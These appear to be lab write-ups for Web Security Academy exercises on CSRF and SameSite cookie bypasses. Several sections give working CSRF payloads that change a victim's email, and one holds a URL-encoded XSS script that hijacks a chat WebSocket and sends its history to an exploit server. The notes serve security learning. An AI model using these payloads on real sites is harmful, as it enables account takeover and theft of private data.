## SameSite Lax bypass via method override

**Key:** `SameSite=Lax` by default (send cookie cross site only when in GET method or request resulted from a top-level navigation by the user, such as clicking on a link)

> **Solve:** override the method using "\_method=POST"
> `<script>
> document.location =
    "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>`

## SameSite Strict bypass via client-side redirect

**Key:** `SameSite=Strict` (only requests coming from the same site is permitted) $\to$ find a client-side redirection $\to$ try to navigate to the changing email path

> **Solve:**
> `<script>
    document.location =
    "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=abc123@xyz.com%26submit=1";
</script>`


## SameSite Strict bypass via sibling domain

**Key:** In the live chat when you send a READY message to the server, it will respond with the chat history

> **Solve:**
> 1. Find a sibling domain (https://cms-0aea004b04f7961c80b94e540071009b.web-security-academy.net)
>    $\to$ see that this domain is vulnerable to a XSS attack
> 2. Make a GET request from the sibling domain to the /login endpoint with the URL encoded version of the [payload.html](\payload.html)
> 3. Since the request is made from a sibling domain, the cookie is carried with the request $\to$ enabling to see the user's chat history
> 4. Deliver the script to the victim and wait for responses in the Access Log $\to$ URL decoded it to get the user's password
>    `<script>
    document.location =
    "https://cms-0aea004b04f7961c80b94e540071009b.web-security-academy.net/login?username=%65%79%4a%31%63%32%56%79%49%6a%6f%69%51%30%39%4f%54%6b%56%44%56%45%56%45%49%69%77%69%59%32%39%75%64%47%56%75%64%43%49%36%49%69%30%74%49%45%35%76%64%79%42%6a%61%47%46%30%64%47%6c%75%5a%79%42%33%61%58%52%6f%49%45%68%68%62%43%42%51%62%47%6c%75%5a%53%41%74%4c%53%4a%39%3c%73%63%72%69%70%74%3e%0a%6c%65%74%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%0a%20%20%22%77%73%73%3a%2f%2f%30%61%65%61%30%30%34%62%30%34%66%37%39%36%31%63%38%30%62%39%34%65%35%34%30%30%37%31%30%30%39%62%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%0a%29%3b%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%3b%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%66%65%74%63%68%28%0a%20%20%20%20%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%37%34%30%30%62%33%30%34%66%34%39%36%34%36%38%30%33%34%34%64%33%32%30%31%34%35%30%30%35%34%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%0a%20%20%20%20%20%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%0a%20%20%29%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=123"
</script>`


### CSRF with broken Referer validation
**Key:** the server check CSRF via the Referer header

> **Solve:**
> 1. Change the file value of the exploit server to the url of the victim website
> 2. Add a header to the response specifying to append the original url to the Referer header: Referrer-Policy: unsafe-url
> 3. Deliver the payload 

### LAB: SameSite Lax bypass via cookie refresh
There are no protection against CSRF attack (no CSRF token) and the authentication process refreshes cookie with SameSite Lax. 
If the user is logged in less than 2 minutes, the change email request is made easily.
If the user is logged in longer than 2 minutes, the authentication process is retaken. This would cause the change email request to be interupted. Therefore, to ensure that the change email request is made, we will need to retake the authentication process. 
But notice that, if you visit `/social-login`, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction. We can trigger this by using this script:

    <form
        action="https://0aa300ad03ce303c82f01ae300e9001a.web-security-academy.net/my-account/change-email"
        method="post"
    >
        <input required type="hidden" name="email" value="evil@gmail.com" />
    </form>
    <p>click me</p> <!-- prevent popup blocker-->
    <script>
        document.onclick = function () {
            window.open(
            "https://0aa300ad03ce303c82f01ae300e9001a.web-security-academy.net/social-login"
            );
            setTimeout(function () {
            document.forms[0].submit();
            }, 5000);
        };
    </script>
